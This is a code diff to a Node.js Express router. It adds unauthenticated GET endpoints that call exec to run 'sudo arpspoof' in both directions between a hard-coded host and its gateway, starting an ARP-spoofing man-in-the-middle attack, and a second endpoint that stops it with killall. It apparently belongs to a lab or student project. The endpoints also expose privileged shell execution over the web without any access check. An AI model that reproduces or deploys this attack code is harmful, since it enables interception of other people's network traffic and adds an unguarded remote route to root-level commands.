@@ -1,6 +1,7 @@
 var express = require('express');
 var bodyParser = require('body-parser');
 var fs = require('fs');
+var exec = require('child_process').exec;
 
 var router = express.Router();
 
@@ -56,6 +57,36 @@ router.post("/login", urlencodedParser, function(req, res, next){
     user.get_user_by_x_y(["username", "password"], [username, password], function(result){
         res.send(result);
     })
+});
+
+router.get("/start_mitm", function(req, res, next){
+
+    var command = "sudo arpspoof -i wlan0 -t 192.168.1.52 192.168.1.1 %% sudo arpspoof -i wlan0 -t 192.168.1.1 192.168.1.52" ;
+
+    //var command = "ipconfig";
+
+    exec(command, function(error, stdout, stderr) {
+        console.log(stdout);
+        if(!error){
+            res.send(true);
+        }else{
+            res.send(false);
+        }
+    });
+});
+
+router.get("/stop_mitm", function(req, res, next){
+
+    var command = "sudo killall arpspoof";
+
+    exec(command, function(error, stdout, stderr) {
+        console.log(stdout);
+        if(!error){
+            res.send(true);
+        }else{
+            res.send(false);
+        }
+    });
 });
 
 module.exports = router;
